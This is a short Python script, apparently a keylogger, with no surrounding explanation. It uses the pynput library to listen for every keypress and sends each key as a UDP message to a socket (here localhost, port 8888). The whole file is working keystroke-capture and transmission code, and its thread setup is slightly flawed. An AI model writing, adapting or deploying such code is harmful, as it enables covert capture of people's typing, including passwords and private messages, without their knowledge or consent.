import socket
import threading
import sys
from pynput.keyboard import Key, Listener



HOST, PORT = 'localhost', 8888

def send():
	with Listener(on_press=on_press) as listener:
	    listener.join()

def on_press(key):
	msg = ('"{0}"'.format(key))
	soc.sendto(msg.encode("ascii"), (HOST,PORT))	    

soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
thread_send = threading.Thread(target=send())
thread_send.start()
